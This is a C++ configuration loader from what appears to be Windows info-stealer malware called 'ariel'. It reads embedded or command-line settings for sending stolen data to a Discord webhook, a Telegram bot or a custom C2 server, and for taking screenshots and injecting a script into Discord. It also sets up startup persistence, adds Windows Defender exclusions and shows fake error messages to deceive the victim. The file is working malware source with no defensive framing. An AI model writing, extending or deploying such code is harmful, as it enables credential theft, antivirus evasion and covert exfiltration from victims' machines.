#include "config.hpp"

#include "embedded_config.hpp"
#include "embedded_injection.hpp"
#include "util.hpp"

#include <windows.h>

namespace ariel::config {

namespace {

void assign_output(options& result, const std::string& value,
                   const util::fs::path& executable_dir) {
    if (value.empty()) return;
    auto path = util::fs::path(util::from_utf8(value));
    if (path.is_relative()) path = executable_dir / path;
    result.output = path;
}

}  // namespace

options load(const int argc, wchar_t** argv, std::string& error) {
    wchar_t executable[MAX_PATH]{};
    GetModuleFileNameW(nullptr, executable, MAX_PATH);
    const util::fs::path executable_dir = util::fs::path(executable).parent_path();

    options result;
    result.discord_webhook = ariel::embedded::discord_webhook;
    result.telegram_token = ariel::embedded::telegram_token;
    result.telegram_chat_id = ariel::embedded::telegram_chat_id;
    result.password = ariel::embedded::password;
    result.install = ariel::embedded::install;
    result.startup_name = ariel::embedded::startup_name;
    result.appdata_dir = ariel::embedded::appdata_dir;
    result.ping_everyone = ariel::embedded::ping_everyone;
    result.defender_exclusions = ariel::embedded::defender_exclusions;
    result.screenshot = ariel::embedded::screenshot;
    result.debug = ariel::embedded::debug;
    result.fake_error = ariel::embedded::fake_error;
    result.fake_error_title = ariel::embedded::fake_error_title;
    result.fake_error_message = ariel::embedded::fake_error_message;
    result.discord_injection = ariel::embedded::discord_injection;
    result.injection_script = ariel::embedded_injection::script;
    result.thumbnail_url = ariel::embedded::thumbnail_url;
    result.custom_c2_url = ariel::embedded::custom_c2_url;
    result.custom_c2_file_field = ariel::embedded::custom_c2_file_field;
    result.custom_c2_headers = ariel::embedded::custom_c2_headers;
    result.custom_c2_fields = ariel::embedded::custom_c2_fields;
    assign_output(result, ariel::embedded::output, executable_dir);

    for (int i = 1; i < argc; ++i) {
        const std::string argument = util::to_utf8(std::wstring(argv[i]));
        if (argument == "--install") {
            result.install = true;
            continue;
        }
        if (argument == "--ping-everyone") {
            result.ping_everyone = true;
            continue;
        }
        if (argument == "--defender" || argument == "--defender-exclusions") {
            result.defender_exclusions = true;
            continue;
        }
        if (argument == "--screenshot") {
            result.screenshot = true;
            continue;
        }
        if (argument == "--debug") {
            result.debug = true;
            continue;
        }
        if (argument == "--fake-error") {
            result.fake_error = true;
            continue;
        }
        if (argument == "--discord-injection") {
            result.discord_injection = true;
            continue;
        }
        if (argument.rfind("--", 0) != 0) continue;
        if (i + 1 >= argc) {
            error = "missing value for " + argument;
            return result;
        }
        const std::string value = util::to_utf8(std::wstring(argv[++i]));
        if (argument == "--webhook" || argument == "--discord") {
            result.discord_webhook = value;
        } else if (argument == "--telegram-token") {
            result.telegram_token = value;
        } else if (argument == "--chat-id") {
            result.telegram_chat_id = value;
        } else if (argument == "--password") {
            result.password = value;
        } else if (argument == "--startup-name") {
            result.startup_name = value;
        } else if (argument == "--appdata-dir") {
            result.appdata_dir = value;
        } else if (argument == "--error-title") {
            result.fake_error_title = value;
        } else if (argument == "--error-message") {
            result.fake_error_message = value;
        } else if (argument == "--out") {
            assign_output(result, value, executable_dir);
        } else if (argument == "--thumbnail-url") {
            result.thumbnail_url = value;
        } else if (argument == "--c2-url") {
            result.custom_c2_url = value;
        } else if (argument == "--c2-field") {
            result.custom_c2_file_field = value;
        } else if (argument == "--c2-headers") {
            result.custom_c2_headers = value;
        } else if (argument == "--c2-fields") {
            result.custom_c2_fields = value;
        } else {
            error = "unknown option " + argument;
            return result;
        }
    }

    if (result.output.empty()) {
        const auto temp = util::environment(L"TEMP");
        result.output = temp.empty() ? executable_dir / "output"
                                     : util::fs::path(temp) / "ariel";
    }
    return result;
}

}  // namespace ariel::config
